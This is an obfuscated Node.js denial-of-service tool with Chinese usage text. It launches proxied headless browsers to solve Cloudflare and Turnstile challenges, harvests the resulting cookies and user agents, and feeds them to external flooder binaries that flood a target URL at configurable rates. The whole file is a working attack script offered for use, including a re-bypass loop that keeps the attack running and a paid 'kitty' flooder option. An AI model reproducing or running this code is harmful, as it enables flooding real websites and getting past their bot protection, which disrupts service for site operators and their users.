const errorHandler = _0x133db8 => {
  console.log();
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function (_0x134bb3) {
  const _0x3ff0d7 = this.indexOf(_0x134bb3);
  if (_0x3ff0d7 !== -1) {
    this.splice(_0x3ff0d7, 1);
  }
  return _0x134bb3;
};
const {
  exec
} = require("child_process");
function spawnHttp2Process(_0x43921f, _0x2bc560, _0x1c1ea6, _0x4547d4, _0x5039d1, _0x10b515, _0x3593a7) {
  return new Promise((_0x200ad4, _0x33bd6c) => {
    const _0x210d28 = [_0x43921f, _0x2bc560, _0x1c1ea6, _0x4547d4, _0x5039d1, _0x10b515, _0x3593a7];
    const _0x3a989c = spawn("./http2", _0x210d28);
    _0x3a989c.stdout.on("data", _0x5e79d1 => {});
    _0x3a989c.stderr.on("data", _0x2020bc => {});
    _0x3a989c.on("close", _0x124f74 => {
      if (_0x124f74 === 0) {
        _0x200ad4();
      } else {
        _0x33bd6c(new Error("洪水脚本启动失败请检查是否授予权限(./http2)"));
      }
    });
    _0x3a989c.on("error", _0x22c3a0 => {
      _0x33bd6c(_0x22c3a0);
    });
  });
}
function spawnKittyProcess(_0x49bc73, _0x3f64e0, _0x41ae7f, _0x1f3935, _0x10e45e, _0x59bcbd, _0x39a3e7, _0x1b8399) {
  return new Promise((_0x4f37ce, _0x1739d8) => {
    const _0x46227b = ["-key", _0x1b8399, "-url", _0x49bc73, "-time", _0x41ae7f, "-cpu", 40, "-threads", "1", "-rate", _0x59bcbd, "-ip", _0x39a3e7, "-ua", _0x3f64e0, "-cookie", _0x1f3935, "-method", _0x10e45e, "-debug", "0", "-close"];
    const _0x223f0c = spawn("./kittys", _0x46227b);
    _0x223f0c.stdout.on("data", _0x3f007b => {});
    _0x223f0c.stderr.on("data", _0x1a7ca1 => {});
    _0x223f0c.on("close", _0x359ad1 => {
      if (_0x359ad1 === 0) {
        _0x4f37ce();
      } else {
        _0x1739d8(new Error("kitty洪水脚本启动失败 请检查是否授予权限或者key是否正确(./kittys)"));
      }
    });
    _0x223f0c.on("error", _0x96d926 => {
      _0x1739d8(_0x96d926);
    });
  });
}
const COOKIES_MAX_RETRIES = 1;
const async = require("async");
const fs = require("fs");
const {
  connect
} = require("puppeteer-real-browser");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
function showHelp() {
  console.clear();
  console.error("Usage: node Browser.js target thread proxy rer(perProxy) duration(perProxy) duration flood(on/off) isRebypass(on/off) --[arg]*");
  console.error("|target: 目标");
  console.error("|threads: 线程数量");
  console.error("|proxyFile: 代理文件");
  console.error("|rates: 每个代理的请求速率");
  console.error("|duration(perProxy): 单个代理洪水的持续时间");
  console.error("|times: 全局攻击时间(绕过时长+攻击时长)");
  console.error("|isFlood: 开启绕过后洪水 建议on开启 (on/off).");
  console.error("|isRebypass: 洪水结束后是否重新绕过并重新攻击(可轮询时开启), 适用于在你代理IP较少的时候, 在代理IP多的情况下会减少你的速率 (在速率限制严格的站点和代理IP数量多时[只会使用你启动对应线程数量的代理IP数,并且剩余IP不会被使用到]谨慎开启) (on/off).");
  console.error(`|其他参数(可选):
--help/--: 显示当前帮助页面
--noheadless: 强制使用有头浏览器 仅作为开发模式使用
--kitty <key>: 使用kitty的洪水 需要目录下有名称为kittys的洪水脚本并且有kitty洪水脚本的使用权限 <key>要填写为你购买后kt给你的key`);
  process.exit(1);
}
const args = process.argv.slice(2);
const targetURL = process.argv[2];
const threads = +process.argv[3];
const proxyFile = process.argv[4];
const rates = process.argv[5];
const times = process.argv[7];
const duration = process.argv[6];
const isFlood = process.argv[8];
const isRebypass = process.argv[9];
let iscloudflare = false;
const additionalArgs = args.filter(_0x1050c1 => _0x1050c1.startsWith("--"));
const ishelp = args.includes("--help") || args.includes("--");
const usehttp2 = args.includes("--http2");
const iskittyflooder = args.includes("--kitty");
const kittyIndex = args.indexOf("--kitty");
let kittyKey = false;
if (iskittyflooder) {
  if (kittyIndex !== -1 && args[kittyIndex + 1]) {
    kittyKey = args[kittyIndex + 1];
  } else {
    console.log("[!] 您尝试使用kitty洪水但是没有key参数: --kitty <key>");
    process.exit(1);
  }
}
if (!targetURL || !threads || !proxyFile || !rates || !duration || typeof isFlood === "undefined" || typeof isRebypass === "undefined" || ishelp) {
  showHelp();
}
const fileContent = fs.readFileSync(proxyFile, "utf8");
const proxiesCount = fileContent.split("\n").length;
console.log("-Target URL:", targetURL);
console.log("-Threads:", threads);
console.log("-Proxy File:", proxyFile);
console.log("-Proxies Count:", proxiesCount);
console.log("-Rates(perProxy):", rates);
console.log("-Duration(perProxy):", duration);
console.log("-times:", times);
console.log("-Flood Mode:", isFlood);
console.log("-rebypass:", isRebypass);
const requestsPerSecond = rates / duration;
const totalRequestsPerProxy = rates * duration;
console.log("-" + requestsPerSecond + " Req/s (perproxy)");
console.log("-Total req perproxy:", totalRequestsPerProxy);
if (additionalArgs.length > 0) {
  console.log("-Add Options:");
  additionalArgs.forEach(_0x442831 => {
    console.log("  " + _0x442831);
  });
} else {
  console.log("-Add Options: None");
}
console.log("—————————————Attack Starting—————————————");
console.log("[~] Please Wait Auth...");
let floodMode;
let rebypassMode;
let bypassdone = true;
let statusCodeStats = {};
if (isFlood === "on") {
  floodMode = "(flooder enable)";
} else if (isFlood === "off") {
  floodMode = "(flooder disable)";
} else {
  process.exit(1);
}
if (isRebypass === "on") {
  rebypassMode = "(rebypass enable)";
} else if (isRebypass === "off") {
  rebypassMode = "(rebypass disable)";
} else {
  process.exit(1);
}
let challengeCount = 0;
const sleep = _0x3ec239 => new Promise(_0x493da4 =>
setTimeout(_0x493da4, _0x3ec239 * 1000));
const {
  spawn
} = require("child_process");
const readLines = _0x416af5 => fs.readFileSync(_0x416af5).toString().split(/\r?\n/);
const randList = _0x2ff563 => _0x2ff563[Math.floor(Math.random() * _0x2ff563.length)];
const proxies = readLines(proxyFile);
const colors = {
  COLOR_RED: "[31m",
  COLOR_GREEN: "[32m",
  COLOR_YELLOW: "[33m",
  COLOR_RESET: "[0m",
  COLOR_PURPLE: "[35m",
  COLOR_CYAN: "[36m",
  COLOR_BLUE: "[34m"
};
function colored(_0x4cf9f0, _0xe2a237) {
  console.log(_0x4cf9f0 + _0xe2a237 + colors.COLOR_RESET);
}
;
async function detectChallenge(_0x298283, _0x39f6b7, _0x129e3d, _0x48fe91) {
  const _0x3a9fe4 = await _0x39f6b7.title();
  const _0x3fb1e6 = await _0x39f6b7.content();
  if (_0x3a9fe4 === "Attention Required! | Cloudflare" || _0x3a9fe4.includes("Access denied")) {
    colored(colors.COLOR_YELLOW, "[-] Cloudflare Proxy blocked " + _0x298283);
    bypassdone = false;
    throw new Error("Proxy blocked");
  }
  if (_0x3fb1e6.includes("challenge-error-text")) {
    colored(colors.COLOR_PURPLE, "[+] Found CloudFlare challenge " + _0x298283);
    iscloudflare = true;
    maxAttempts = 3;
    index = 0;
    try {
      while (index < maxAttempts) {
        await _0x39f6b7.waitForNavigation({
          waitUntil: "networkidle0",
          timeout: 100000
        });
        const _0x249e73 = await _0x39f6b7.title();
        const _0x3def92 = await _0x39f6b7.$$("[name=\"cf-turnstile-response\"]");
        if (_0x3def92.length === 0 && !_0x249e73.includes("Just a moment...") && !_0x249e73.includes("请稍候...")) {
          colored(colors.COLOR_GREEN, "[-] Bypass CloudFlare challenge(type1) " + _0x298283);
          bypassdone = true;
          break;
        } else {
          colored(colors.COLOR_RESET, "[~] Switch Turnstile Bypass Mode " + _0x298283);
          await _0x39f6b7.goto(_0x48fe91, {
            waitUntil: "domcontentloaded",
            timeout: 20000
          });
          await sleep(6);
        }
        try {
          const _0x2cd166 = await _0x39f6b7.$$("[name=\"cf-turnstile-response\"]");
          if (_0x2cd166.length === 0) {
            const _0x586e6f = await _0x39f6b7.evaluate(() => {
              const _0x2433b9 = [];
              const _0x5d8caa = () => {
                document.querySelectorAll("div").forEach(_0x4ed6c5 => {
                  const _0x47d33f = _0x4ed6c5.getBoundingClientRect();
                  const _0x5d3da8 = window.getComputedStyle(_0x4ed6c5);
                  if (_0x5d3da8.margin === "0px" && _0x5d3da8.padding === "0px" && _0x47d33f.width > 290 && _0x47d33f.width <= 310 && !_0x4ed6c5.querySelector("*")) {
                    const _0x9248ae = {
                      x: _0x47d33f.x,
                      y: _0x47d33f.y,
                      w: _0x47d33f.width,
                      h: _0x47d33f.height
                    };
                    _0x2433b9.push(_0x9248ae);
                  }
                });
              };
              _0x5d8caa();
              if (_0x2433b9.length === 0) {
                _0x5d8caa();
              }
            });
            for (const {
              x: _0x283086,
              y: _0x2f50f7,
              h: _0x410686
            } of _0x586e6f) {
              await _0x39f6b7.mouse.click(_0x283086 + 30, _0x2f50f7 + _0x410686 / 2);
            }
          } else {
            for (const _0x16b7f5 of _0x2cd166) {
              const _0x2075e9 = await _0x16b7f5.evaluateHandle(_0x7bc087 => _0x7bc087.parentElement);
              const _0x53ee0b = await _0x2075e9.boundingBox();
              await _0x39f6b7.mouse.click(_0x53ee0b.x + 30, _0x53ee0b.y + _0x53ee0b.height / 2);
            }
          }
        } catch (_0x2fb8d2) {}
        await sleep(6);
        const _0x5e7610 = await _0x39f6b7.title();
        const _0x1a2851 = await _0x39f6b7.$$("[name=\"cf-turnstile-response\"]");
        if (_0x1a2851.length === 0 && (!_0x5e7610.includes("Just a moment...") || !_0x5e7610.includes("请稍候..."))) {
          colored(colors.COLOR_GREEN, "[-] Bypass CloudFlare challenge " + _0x298283);
          bypassdone = true;
          break;
        } else {
          colored(colors.COLOR_YELLOW, "[!] Fail Bypass CloudFlare challenge Try again " + _0x298283);
          await _0x39f6b7.goto(_0x48fe91, {
            waitUntil: "domcontentloaded",
            timeout: 20000
          });
        }
        index++;
      }
    } catch (_0x2d854f) {
      bypassdone = true;
      throw new Error("Fail Bypass");
    } finally {
      await sleep(3);
      return;
    }
  }
  colored(colors.COLOR_PURPLE, "[+] No challenge detected or JS/delay challenge wait for 10s - " + _0x298283);
  await sleep(10);
  bypassdone = true;
  return;
}
async function openBrowser(_0x297851, _0x5c7aca, _0x293e78) {
  const _0x8bc8e6 = async (_0x5499fe, _0x10bf38) => {
    const [_0x226f21, _0x73be1] = _0x5c7aca.split(":");
    let _0x55c239;
    let _0x5d86ac;
    const _0x3a7ab1 = {
      host: _0x226f21,
      port: _0x73be1
    };
    const _0x3283ca = {
      headless: false,
      turnstile: true,
      disableXvfb: false,
      args: ["--ignore-certificate-errors", "--window-size=1600,900"],
      proxy: _0x3a7ab1,
      defaultViewport: null
    };
    const _0x1799dd = _0x3283ca;
    try {
      ({
        page: _0x55c239,
        browser: _0x5d86ac
      } = await connect(_0x1799dd));
      await _0x55c239.setViewport({
        width: 1920,
        height: 1080
      });
    } catch (_0x4c920b) {
      colored(colors.COLOR_YELLOW, "[-] Error browser " + _0x5c7aca);
      if (_0x5d86ac) {
        _0x5d86ac.close();
      }
      throw _0x4c920b;
    }
    try {
      colored(colors.COLOR_YELLOW, "[+] Started browser " + _0x5c7aca);
      const _0x3d94eb = _0x55c239._client();
      _0x55c239.on("framenavigated", _0x193d64 => {
        if (_0x193d64.url().includes("challenges.cloudflare.com")) {
          const _0x3c9557 = {
            targetId: _0x193d64._id
          };
          _0x3d94eb.send("Target.detachFromTarget", _0x3c9557);
        }
      });
      _0x55c239.setDefaultNavigationTimeout(60000);
      const _0x165ee6 = await _0x55c239.evaluate(function () {
        return navigator.userAgent;
      });
      let _0x3192d2 = null;
      const _0xcfe6b4 = await _0x55c239.goto(_0x297851, {
        waitUntil: "domcontentloaded",
        timeout: 10000
      });
      _0x3192d2 = _0xcfe6b4.status();
      _0x55c239.on("response", async _0x52e30c => {
        if (_0x52e30c.url() === _0x297851) {
          const _0x22931a = _0x52e30c.status();
          if (_0x22931a !== _0x3192d2) {
            _0x3192d2 = _0x22931a;
          }
        }
      });
      await detectChallenge(_0x5c7aca, _0x55c239, _0x5d86ac, _0x297851, _0x10bf38);
      const _0x1aa0ec = await _0x55c239.title();
      const _0x4dc6af = await _0x55c239.cookies(_0x297851);
      _0x5499fe({
        title: _0x1aa0ec,
        browserProxy: _0x5c7aca,
        cookies: _0x4dc6af.map(_0x40fe45 => _0x40fe45.name + "=" + _0x40fe45.value).join("; ").trim(),
        userAgent: _0x165ee6,
        content: await _0x55c239.content(),
        statusCode: _0x3192d2
      });
    } catch (_0xa878a9) {
      _0x293e78(_0xa878a9);
      throw _0xa878a9;
    } finally {
      colored(colors.COLOR_YELLOW, "[-] Closed browser " + _0x5c7aca);
      await _0x5d86ac.close();
    }
  };
  return new Promise(_0x8bc8e6);
}
async function startThread(_0x4e06ef, _0x4ebf9e, _0x16e678, _0x4b28ad, _0x3f14b6 = 0) {
  if (_0x3f14b6 === COOKIES_MAX_RETRIES) {
    const _0x75db9c = queue.length();
    const _0x4f271f = {
      task: _0x16e678,
      currentTask: _0x75db9c
    };
    _0x4b28ad(null, _0x4f271f);
  } else {
    try {
      const _0x3c7e4b = await openBrowser(_0x4e06ef, _0x4ebf9e, _0x4b28ad);
      const _0x516c6e = _0x3c7e4b.statusCode;
      if (_0x516c6e) {
        statusCodeStats[_0x516c6e] = (statusCodeStats[_0x516c6e] || 0) + 1;
      }
      if (bypassdone === true) {
        challengeCount++;
        const _0x1b9180 = "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n┣Title: " + _0x3c7e4b.title + "\n┣Proxy: " + _0x3c7e4b.browserProxy + "\n┣User Agent: " + _0x3c7e4b.userAgent + "\n┣Cookie: " + _0x3c7e4b.cookies + "\n┣Status Code: " + _0x516c6e + "\n┣Challenges solved: " + challengeCount + "\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛";
        colored(colors.COLOR_CYAN, "[+] Challenge solved" + floodMode + " " + rebypassMode);
        colored(colors.COLOR_CYAN, _0x1b9180);
        if (isFlood === "on") {
          if (kittyKey) {
            colored(colors.COLOR_CYAN, "[+] Use Kitty Flood");
            await spawnKittyProcess(_0x4e06ef, _0x3c7e4b.userAgent, duration, _0x3c7e4b.cookies, "GET", rates, _0x3c7e4b.browserProxy, kittyKey);
          } else if (usehttp2) {
            colored(colors.COLOR_CYAN, "[+] Use Flood");
            await spawnHttp2Process(_0x4e06ef, _0x3c7e4b.userAgent, duration, _0x3c7e4b.cookies, "GET", rates, _0x3c7e4b.browserProxy);
          } else if (iscloudflare) {
            colored(colors.COLOR_CYAN, "[+] Use Flood");
            await spawnHttp2Process(_0x4e06ef, _0x3c7e4b.userAgent, duration, _0x3c7e4b.cookies, "GET", rates, _0x3c7e4b.browserProxy);
          } else {
            await spawnHttp2Process(_0x4e06ef, _0x3c7e4b.userAgent, duration, _0x3c7e4b.cookies, "GET", rates, _0x3c7e4b.browserProxy);
          }
        }
        if (isRebypass === "on") {
          colored(colors.COLOR_CYAN, "[-] Flood end rebypass " + _0x3c7e4b.browserProxy);
          await startThread(_0x4e06ef, _0x4ebf9e, _0x16e678, _0x4b28ad);
        }
        colored(colors.COLOR_CYAN, "[-] Flood end " + _0x3c7e4b.browserProxy);
        await startThread(_0x4e06ef, _0x4ebf9e, _0x16e678, _0x4b28ad, COOKIES_MAX_RETRIES);
      } else {
        colored(colors.COLOR_RED, "[!] Fail to solve challenge " + _0x3c7e4b.browserProxy + " - Status Code: " + _0x516c6e + " - Cookies: " + _0x3c7e4b.cookies + " | Try again..");
        await startThread(_0x4e06ef, _0x3c7e4b.browserProxy, _0x16e678, _0x4b28ad);
      }
    } catch (_0x3ecdcb) {
      _0x4b28ad(_0x3ecdcb);
      await startThread(_0x4e06ef, _0x4ebf9e, _0x16e678, _0x4b28ad);
    }
  }
}
function GetAllStatusCodeStats() {
  if (Object.keys(statusCodeStats).length === 0) {
    return;
  }
  let _0x2eb092 = Object.entries(statusCodeStats).map(([_0x4efe45, _0xb5722e]) => "[" + _0x4efe45 + "]x" + _0xb5722e).join(" ");
  colored(colors.COLOR_CYAN, "- StatusCode: " + _0x2eb092);
}
var queue = async.queue(function (_0xc26af2, _0x570452) {
  startThread(targetURL, _0xc26af2.browserProxy, _0xc26af2, _0x570452);
}, threads);
async function __main__() {
  const _0x559873 = () => {};
  queue.drain(_0x559873);
  for (let _0x584742 = 0; _0x584742 < 100000; _0x584742++) {
    const _0x4e57f6 = randList(proxies);
    proxies.remove(_0x4e57f6);
    const _0x27468b = {
      browserProxy: _0x4e57f6
    };
    queue.unshift(_0x27468b);
    if (proxies.length == 0) {
      readLines = _0x35903f => fs.readFileSync(_0x35903f).toString().split(/\r?\n/);
      proxies = readLines(proxyFile);
    }
  }
}
process.on("exit", async () => {
  GetAllStatusCodeStats();
  await killChrome();
});
process.on("SIGINT", async () => {
  console.log("—————————————Attack Stop—————————————");
  killChrome();
  process.exit();
});
process.on("SIGTERM", async () => {
  console.log("—————————————Attack Stop—————————————");
  killChrome();
  process.exit();
});
function killChrome() {
  exec("pkill -u $USER chrome", (_0x3b8a82, _0x5efc2b, _0x4b7eed) => {});
  exec("pkill -u $USER http2", (_0x357b22, _0x50c846, _0x2acf10) => {});
  exec("pkill -u $USER kittys", (_0x20dec9, _0x26d267, _0x457a24) => {});
  exec("pkill -u $USER http1", (_0x4557a6, _0x47a63d, _0x10a558) => {});
  exec("pkill -u $USER Xvfb", (_0xf530e0, _0x32add4, _0x2c7be4) => {});
}
__main__();
setTimeout(function () {
  process.exit();
}, process.argv[7] * 1000);
